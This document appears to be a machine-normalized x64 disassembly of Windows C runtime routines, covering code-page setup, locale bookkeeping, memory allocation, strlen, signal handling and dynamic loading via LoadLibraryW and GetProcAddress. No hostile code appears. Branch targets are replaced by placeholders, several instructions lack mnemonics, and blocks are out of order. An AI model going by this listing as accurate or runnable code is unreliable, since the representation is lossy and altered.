mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_180005c84
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_1800035c8
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_1800035c8
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_1800035c8
mov rcx [ rbx + 0x130 ]
call sub_1800035c8
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_180007290
mov rcx [ rbx + 0x158 ]
call sub_1800035c8
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
dec rsi
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_1800035c8
cmp [ rcx ] 0x0
jne r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x110 ]
call sub_1800035c8
mov rcx [ rbx + 0x128 ]
call sub_1800035c8
cmp [ rcx ] 0x0
jne r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x128 ]
call sub_1800076ec
call sub_1800035c8
call sub_1800035c8
mov rcx [ rbx + 0x128 ]
call sub_180007680
sub_180005e00
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_180005b54
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_180005be0
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_180005c84
sub_180005e58
push rbx
sub rsp 0x20
call sub_180004044
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_1800056f8
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_180005e00
mov rbx rax
mov ecx 0xc
call sub_1800055f8
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_180004768
call sub_180004044
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_180005ed0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8d esi
xor edx edx
call sub_1800030c0
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0xc ] r11d
mov [ rbp + 0x4 ] r11
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
dec rsi
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
dec rdx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180005f5c
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push rbp
lea rbp [ rax - 0x488 ]
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x470 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rcx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rcx ] al
inc eax
inc rcx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rbp + 0x470 ]
xor rcx rsp
call sub_180003090
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x270 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_180007cbc
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x70 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_180007ac4
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_180007ac4
lea rdx [ rbp + 0x70 ]
lea r8 [ rbp + 0x170 ]
sub rdx rsi
lea r11 [ rbp + 0x270 ]
lea rcx [ rsi + 0x1d ]
sub r8 rsi
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov eax r8d
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_1800030c0
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rdx + rcx - 0x1d ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ r8 + rcx - 0x1d ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
add r11 0x2
dec rbx
jne r-xdata
sub_18000614c
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_180004044
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_1800056f8
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_1800055f8
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_180004768
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ]
mov rbx [ rsp + 0x30 ]
[ rbx ]
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_1800035c8
sub_180006208
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movups xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_180004044
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
cmp rdx [ rw-data ]
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_180005e58
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_18000614c
mov [ rbx + 0x8 ] rax
sub_1800062ac
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180006208
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_18000633c
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_1800062ac
xor ebx ebx
mov edi eax
test eax eax
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_180005ed0
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_1800030c0
lea r10 [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
shl r10 0x4
mov ebp 0x4
lea r8 [ r10 + r13 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub rbp r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_180003090
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi + rcx ]
mov [ rcx ] ax
add rcx 0x2
sub rdx r12
jne r-xdata
mov rcx rsi
call sub_180005f5c
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
sub r10 rsi
mov [ rsi + 0xc ] ebx
lea rcx [ rsi + 0x10 ]
lea rdi [ r10 + r13 - 0xc ]
mov edx 0x6
mov ebx 0x412
jmp r-xdata
dec edi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_1800030c0
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
dec ecx
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_1800065b4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_180004044
mov rsi rax
call sub_18000614c
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_1800062ac
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_180004260
mov rbx rax
xor edi edi
test rax rax
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_1800031c0
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_18000633c
mov r13d eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
[ rcx ]
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ]
test [ rsi + 0xc8 ] 0x2
jne r-xdata
mov rcx [ rsi + 0xb8 ]
cmp rcx r12
je r-xdata
call sub_180003afc
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_1800035c8
test [ rw-data ] 0x1
jne r-xdata
call sub_1800035c8
mov esi 0xd
mov ecx esi
call sub_1800056f8
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
lea r8 [ __dos_header ]
mov edx edi
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x34fc0 ] ax
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
cmp edi 0x100
jge r-xdata
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x317e0 ] al
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ]
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0x318f0 ] al
inc edi
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ]
mov ecx esi
call sub_1800055f8
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
call sub_1800035c8
sub_1800067bc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_180003afc
mov [ rax ] 0xc
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180003b6c
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_1800068cc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov ebx ecx
xor edi edi
mov [ rsp + 0x60 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_180003fc0
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_18000474c
int3
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ r--data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_1800056f8
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
mov edi 0x1
mov [ rsp + 0x60 ] edi
call [ DecodePointer@IAT ]
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x28 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x60 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ r--data ]
mov edx ecx
mov [ rsp + 0x20 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x28 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
dec edx
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_1800055f8
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x20 ] edx
mov ecx [ r--data ]
jmp r-xdata
call sub_180003afc
mov [ rax ] 0x16
call sub_1800054cc
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ r--data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
mov [ rsi + 0xb0 ] r14d
jmp r-xdata
cmp ebx 0x4
jne r-xdata
sub_180006b10
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_1800042e0
mov rcx rax
mov rbx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180006b54
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_180004440
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov r12 rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_180007d3c
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call [ EncodePointer@IAT ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_18000444c
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_180004364
xor ebx ebx
test rax rax
jne r-xdata
mov rcx r12
call sub_180004364
test rax rax
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_180006c78
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call [ EncodePointer@IAT ]
mov [ rbx ] rax
add rbx 0x8
dec rdi
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180006cb0
push rbx
sub rsp 0x20
test rcx rcx
je r-xdata
call sub_180003afc
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
sub r9 r8
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_180003afc
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ r9 + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_1800054cc
mov eax ebx
sub_180006d30
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_180006dd8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov ebx edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov edi r9d
mov esi r8d
call sub_180006208
mov rax [ rsp + 0x28 ]
movzx r11d bl
test [ r11 + rax + 0x1d ] dil
jne r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax esi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_180006e68
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov ebp r8d
mov r14 rdx
mov r13 rcx
call EncodePointer
xor ebx ebx
cmp [ rw-data ] rbx
mov rdi rax
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov rcx rax
call [ DecodePointer@IAT ]
mov rcx [ rw-data ]
mov rsi rax
call [ DecodePointer@IAT ]
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r14
mov rdx r13
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_180003090
add rsp 0x50
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov r9d 0xc
lea r8 [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x40 ] 0x1
jne r-xdata
sub_180007070
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_180003afc
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10w
je r-xdata
